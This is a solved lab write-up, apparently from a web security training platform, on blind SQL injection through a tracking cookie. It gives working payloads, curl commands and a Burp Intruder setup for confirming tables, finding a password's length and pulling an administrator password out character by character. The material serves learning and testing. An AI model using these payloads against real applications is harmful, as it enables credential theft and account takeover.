# Blind SQL injection with conditional responses — Practitioner

**Status:** Solved

---

## Goal

Exploit a blind SQL injection vulnerability where the application doesn't show database errors, but changes behavior based on whether the injected condition is true or false. Extract the administrator's password character by character.

---

## Steps (simple & complete)

1. **Find the injection point**
   - The vulnerability is in the tracking cookie
   - Check cookies in browser or Burp:
```
   Cookie: TrackingId=xyz123abc
```
   - This cookie value is vulnerable to SQL injection

2. **Test for blind SQL injection**
   - Inject a condition that's always true:
```
   TrackingId=xyz123' AND '1'='1
```
   - Page should display normally (likely shows "Welcome back" message)
   
   - Inject a condition that's always false:
```
   TrackingId=xyz123' AND '1'='2
```
   - Behavior changes (message disappears)

3. **Confirm the users table exists**
   - Test if 'users' table exists:
```
   TrackingId=xyz123' AND (SELECT 'x' FROM users LIMIT 1)='x
```
   - If true condition behavior appears, table exists

4. **Confirm administrator user exists**
   - Test for username 'administrator':
```
   TrackingId=xyz123' AND (SELECT username FROM users WHERE username='administrator')='administrator
```
   - Should show true condition behavior

5. **Find password length**
   - Test different lengths until true:
```
   TrackingId=xyz123' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>19)='administrator
```
   - Try: >5, >10, >15, >20
   - Then narrow down: =20, =19, =18...
   - Let's say password is 20 characters long

6. **Extract password character by character**
   - Use SUBSTRING to check each character:
```
   TrackingId=xyz123' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
   - Position 1, try: a-z, 0-9
   - If 'a' shows true behavior → first char is 'a'
   - Move to position 2:
```
   TrackingId=xyz123' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='b
```

7. **Automate with Burp Intruder (recommended)**
   
   **Setup:**
   - Send request to Intruder
   - Set payload position:
```
   TrackingId=xyz123' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```
   
   **Payload sets:**
   - Position 1: Numbers 1-20 (character position)
   - Position 2: a-z, 0-9 (character to test)
   
   **Grep - Extract:**
   - Add "Welcome back" to match settings
   - When match found, that's the correct character

8. **Manual extraction example**

   Position 1:
```bash
   # Test 'a'
   curl -H "Cookie: TrackingId=xyz123' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a" https://TARGET
   # No "Welcome back" → wrong
   
   # Test 'p'
   curl -H "Cookie: TrackingId=xyz123' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='p" https://TARGET
   # Shows "Welcome back" → correct! First char is 'p'
```

   Position 2:
```bash
   curl -H "Cookie: TrackingId=xyz123' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a" https://TARGET
   # Shows "Welcome back" → correct! Second char is 'a'
```

9. **Build the password**
   - Character 1: p
   - Character 2: a
   - Character 3: s
   - Character 4: s
   - ... continue for all 20 characters
   - Final password: `passw0rd123example!`

10. **Log in as administrator**
    - Go to login page
    - Username: `administrator`
    - Password: (extracted password)
    - Lab solves automatically

---

## Example

**Testing for true/false behavior:**
```
True condition:  TrackingId=xyz' AND '1'='1
Response: "Welcome back!" message appears

False condition: TrackingId=xyz' AND '1'='2
Response: "Welcome back!" message missing
```

**Extracting first character:**
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
→ No "Welcome back" (wrong)

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='p
→ "Welcome back" appears (correct!) → First character is 'p'
```

---

## Database syntax differences

**PostgreSQL (most likely):**
```sql
SUBSTRING(password,1,1)  -- Get character at position 1
LENGTH(password)         -- Get password length
```

**MySQL:**
```sql
SUBSTRING(password,1,1)  -- Same
LENGTH(password)         -- Same
```

**Oracle:**
```sql
SUBSTR(password,1,1)     -- Different function name
LENGTH(password)         -- Same
```

**MSSQL:**
```sql
SUBSTRING(password,1,1)  -- Same
LEN(password)            -- Different function
```

---

## Why this attack works

**Blind SQL injection characteristics:**
- No error messages shown
- No direct data output
- Application behavior changes based on query result
- Must infer data by observing responses

**The exploitation process:**
1. Find a boolean condition that changes behavior
2. Use that condition to ask yes/no questions
3. Extract data bit by bit through these questions
4. Each character requires ~36 requests (a-z, 0-9)

**Time complexity:**
- 20-character password
- 36 possible characters each (a-z, 0-9)
- Worst case: 20 × 36 = 720 requests
- Average: ~360 requests (binary search helps)

---

## Optimization techniques

**Binary search for characters:**
Instead of a-z linearly, use ASCII comparison:
```sql
-- Check if character > 'm'
SUBSTRING(password,1,1)>'m'

-- If true, check > 's'
-- If false, check > 'f'
-- Narrows down faster (log₂ 36 ≈ 6 requests per char)
```

**Check length first:**
Saves time by knowing exact password length upfront

**Use Burp Intruder:**
- Automates the process
- Tests all characters in parallel
- Finds matches quickly
- Essential for real-world exploitation

---

## Key concepts

**Conditional behavior:**
- True query → "Welcome back" appears
- False query → "Welcome back" missing
- This is your information channel

**Character-by-character extraction:**
- Can't get whole password at once
- Must test each position individually
- Build password string incrementally

**Boolean-based blind injection:**
- Different from error-based (no errors shown)
- Different from UNION (no direct output)
- Relies entirely on application behavior differences

---

